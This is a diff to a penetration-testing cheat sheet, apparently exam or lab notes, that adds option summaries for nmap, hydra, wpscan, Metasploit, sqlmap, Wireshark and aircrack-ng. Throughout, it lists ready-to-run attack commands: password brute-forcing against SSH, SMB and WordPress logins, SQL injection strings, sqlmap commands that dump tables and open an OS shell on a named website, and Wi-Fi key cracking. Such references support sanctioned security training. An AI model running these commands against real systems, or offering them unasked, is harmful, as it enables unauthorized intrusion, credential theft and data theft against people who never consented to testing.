@@ -3,6 +3,15 @@ nmap -sn <IP Block>
 netdiscovery -r <IP Block>
 
 ########################################################## NMAP scans #####################################################################
+Nmap options 
+optional
+-p : ports //-p- all ports(1-65535) | -p80,445 only 80 and 445 ports 
+-Pn : Don't send icmp packet before scanning
+-A : -sV -O traceroute ...
+-sV : Version scan
+-sC : Default script scan
+-v: verbose
+-O : OS Detection
 
 nmap -sn 10.10.10.10/24 -oN nmap.txt
 nmap -sC -sV -sS -O 10.10.10.11 -oN nmap.txt
@@ -62,9 +71,6 @@ nmap -O 170.16.0.1/24 -oN namp-OS.txt
 namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt
 nmap -p 3389 <IP/24> # RDP hosts scan
 nmap -p 139,445 --open -sV 10.10.55.0/24 | searching smb
-
-
-
 
 
 ### Finding Domain Controller and FQDN ####
@@ -132,7 +138,13 @@ smbclient //ip/share -U raj%123
 smbclient -L \\ip
 smbclient \\\\ip\\share_name -U user%password
 ################################################# Brute Forcing   ##################################################################
+Hydra Options 
 
+optional
+-l : specific username (John,root,guest)
+-L : username wordlist (/usr/share/wordlists/users.txt)
+-p : spesific password (qwerty,password1)
+-P : password wordlist (/usr/share/wordlists/rockyou.txt)
 https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
 
 usage : hydra -l <username> -P <Wordlist Path> <Protocol>://<IP>
@@ -150,12 +162,26 @@ hydra -P common-snmp-community-strings.txt target.com snmp
 hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
 hydra -l root -P passwords.txt <IP> ssh
 
-optional
--l : specific username (John,root,guest)
--L : username wordlist (/usr/share/wordlists/users.txt)
--p : spesific password (qwerty,password1)
--P : password wordlist (/usr/share/wordlists/rockyou.txt)
 
+################################################# WpScan ###################################################################################
+
+WpScan Key Options:
+--url: Target URL (e.g., https://example.com).
+--enumerate: Enumerate details (e.g., u for users, p for plugins, vt for vulnerable themes).
+--api-token: Use WPScan API for vulnerability data.
+--passwords: Specify a password file for brute-forcing.
+--usernames: Define usernames for login attempts.
+--random-agent: Use a random user agent.
+--output: Save scan results to a file.
+--stealthy: Reduce request rate for stealthy scans.
+####Basic scan
+wpscan --url https://example.com
+####Enumerate users and plugins
+wpscan --url https://example.com --enumerate u,p
+####Brute-force login
+wpscan --url https://example.com --usernames admin --passwords passwords.txt
+####Save output to a file
+wpscan --url https://example.com --output results.txt
 
 Wpscan
 Wpscan –url http://ip/ --enumerate u
@@ -163,6 +189,22 @@ wpscan --url http://ip:port/uri -u root -P passwdfile.txt
 wpscan -u james -P /password.txt — urlhttp://:8080/TEST
 
 ############################################################### Metasploit ##################################################################
+
+Metasploit Basic Options:
+-h: Show help.
+-q: Quiet mode (minimal output).
+-v: Enable verbose mode.
+-L: List modules, payloads, exploits, or listeners.
+-x <command>: Run commands directly upon startup.
+Key Commands:
+use <module>: Load a module (e.g., exploit).
+set <option> <value>: Set module options (e.g., target IP).
+show <type>: List available exploits, payloads, or options.
+show exploits
+show payloads
+show options
+
+
 msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 show options
 set PASS_FILE /home/anar/password.txt
@@ -181,6 +223,41 @@ run
 https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
 
 ################################################################## Sql injection ##################################################################
+
+SQLMAP Key Options:
+
+Target URL:
+-u <URL> – Specify the target URL.
+sqlmap -u "http://example.com/page?id=1"
+Data Submission:
+--data="<POST_DATA>" – Test POST data.
+sqlmap -u "http://example.com/login" --data="username=admin&password=pass"
+Database Enumeration:
+--dbs – List databases.
+--tables – List tables in a database (-D <database>).
+--columns – List columns in a table (-D <database> -T <table>).
+--dump – Dump data from a table (-D <database> -T <table>).
+Authentication:
+--cookie="<COOKIE>" – Use session cookies.
+--auth-type=<type> – Specify authentication type (basic, digest).
+Level & Risk:
+--level=<1-5> – Test depth (default: 1).
+--risk=<1-3> – Risk level for payloads (default: 1).
+Detection Options:
+--banner – Retrieve the DBMS banner.
+--current-db – Get the current database.
+--current-user – Find the current user.
+Advanced Testing:
+--time-sec=<seconds> – Adjust time-based payload delays.
+--threads=<number> – Set the number of threads.
+Bypass Filters:
+--random-agent – Use random user-agent strings.
+--tamper=<script> – Use tamper scripts.
+######Dump data from a specific table:
+sqlmap -u "http://example.com/page?id=1" -D test_db -T users --dump
+######Use cookie for testing:
+sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
+
 
 Sqlmap -r req.txt   --dbs
 Sqlmap -r req.txt -D dvwa
@@ -218,6 +295,19 @@ admin’ or 1=1 - -
  `sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" --os-shell`
 
 ############################################################## Wireshark Usefull Filters################################################################
+
+Wireshark Capture Options:
+-i <interface>: Specify the network interface to capture traffic.
+-k: Start capturing immediately.
+-w <file>: Write capture data to a file.
+-f <filter>: Apply a capture filter (e.g., tcp port 80).
+Display Options:
+-r <file>: Read a capture file.
+-Y <filter>: Apply a display filter (e.g., http).
+-T <format>: Set output format (e.g., fields, json).
+
+
+
 ip.addr == 192.168.1.1: Show packets to or from the specified IP address.
 ip.src == 192.168.1.1: Show packets from the specified source IP address.
 ip.dst == 192.168.1.1: Show packets to the specified destination IP address.
@@ -299,6 +389,16 @@ When prompted to Enter a device name, type the target Android device’s IP addr
 #################################################################################################################################################################################
 
 ####################################################### WIFI Hacking ########################################################################################################
+
+aircrack-ng Key Options:
+-a: Force attack mode (1=WEP, 2=WPA).
+-b: Target BSSID (AP MAC address).
+-w: Specify wordlist for WPA/WPA2 cracking.
+-e: Target ESSID (network name).
+-l: Write the found key to a file.
+-q: Quiet mode (less output).
+-s: Display ASCII key for WEP.
+
 Crack the wireless encryption and identify the Wi-Fi password
 1st tentative:** `aircrack-ng pcapfile` (usually works only for WEP encryption)
 2nd tentative**: `aircrack-ng -w passwordlist pcapfile`
